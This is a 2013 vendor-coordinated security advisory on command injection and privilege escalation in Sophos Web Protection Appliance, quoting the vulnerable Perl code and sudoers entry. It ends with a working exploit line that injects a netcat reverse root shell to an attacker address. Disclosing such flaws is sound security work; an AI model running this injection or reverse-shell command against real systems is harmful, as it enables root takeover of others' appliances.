https://www.coresecurity.com/core-labs/advisories/sophos-web-protection-appliance-multiple-vulnerabilities

1. Advisory Information
Title: Sophos Web Protection Appliance Multiple Vulnerabilities
Advisory ID: CORE-2013-0809
Advisory URL: https://www.coresecurity.com/core-labs/advisories/sophos-web-protection-appliance-multiple-vulnerabilities
Date published: 2013-09-06
Date of last update: 2013-09-06
Vendors contacted: Sophos
Release mode: Coordinated release

2. Vulnerability Information
Class: OS command injection [CWE-78], OS command injection [CWE-78]
Impact: Code execution, Security bypass
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2013-4983, CVE-2013-4984

3. Vulnerability Description
Sophos Web Protection Appliance [1] provides advanced web malware protection, URL filtering and content control (including scanning of HTTPS traffic) in a Secure Web Gateway appliance. Sophos Web Protection Appliance is available both as a hardware appliance and as a VMware virtual appliance.

Multiple vulnerabilities have been found in Sophos Web Protection Appliance that could allow an unauthenticated remote attacker to execute arbitrary OS commands and escalate privileges to gain root permissions within the appliance. The OS command injection vulnerability can be exploited by remote unauthenticated attackers that can reach the web interface of the appliance. The privilege escalation vulnerability allows an attacker that already gained code execution on the appliance to escalate privileges from the operating system user spiderman to root.

4. Vulnerable Packages
Sophos Web Appliance v3.7.9 and earlier.
Sophos Web Appliance v3.8.0.
Sophos Web Appliance v3.8.1.

Other versions may be affected too but they were no checked.

5. Non-Vulnerable Packages
Sophos Web Protection Appliance v3.7.9.1.
Sophos Web Protection Appliance v3.8.1.1.

6. Privilege escalation through local OS command injection vulnerability
[CVE-2013-4984] The Apache web server within the Sophos appliance runs under the spiderman user. The /etc/sudoers file defines a list of Bash and Perl scripts that the spiderman user can run with the sudo command:

spiderman ALL=NOPASSWD:/opt/sophox/bin/configure_interface, \ /opt/sophox/bin/sophox-register, \ /opt/sophox/bin/sophox-remote-assist, \ [...] /opt/cma/bin/clear_keys.pl, \ [...] 
The Perl script /opt/cma/bin/clear_keys.pl is vulnerable to OS command injection, because its close_connections() function:

sub close_connections { my ($client_ip, $signum, $signame) = @_; my @connections = `/bin/netstat -nap|grep ^tcp.*:22.*$client_ip.*EST`; foreach (@connections) { if(/ESTABLISHED\s*(\d+)\/sshd/) { my $conn_pid = $+; log_info("connection PID: $conn_pid; my PID: $$; my process tree: " . join(', ', @my_process_tree)); next if (grep {$_ == $conn_pid} @my_process_tree); log_info("Attempting to stop process '$conn_pid' with $signame"); kill $signum, $conn_pid; } } } 
doesn't escape the second argument of the script before using it within a string that will be executed as a command by using backticks. Since it can be run by the spiderman user with the sudo command, it can be abused to gain root privileges within the appliance.

The following command can be executed within a compromised Web Protection Appliance to escalate privileges from spiderman user to root and gain a reverse root shell on attacker's machine at 192.168.1.100:

$ sudo /opt/cma/bin/clear_keys.pl fakeclientfqdn ";/bin/nc -c /bin/bash 192.168.1.100 5555;" /fakedir
